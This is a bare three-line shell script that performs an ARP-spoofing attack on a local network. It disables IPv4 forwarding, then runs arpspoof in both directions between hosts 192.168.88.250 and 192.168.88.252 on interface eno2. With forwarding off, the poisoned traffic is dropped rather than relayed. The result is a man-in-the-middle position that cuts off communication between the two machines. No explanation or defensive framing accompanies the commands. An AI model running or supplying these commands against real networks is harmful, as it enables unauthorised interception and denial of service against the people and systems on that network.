sudo sysctl net.ipv4.ip_forward=0
arpspoof -i eno2 -t 192.168.88.250 192.168.88.252 &
arpspoof -i eno2 -t 192.168.88.252 192.168.88.250 &

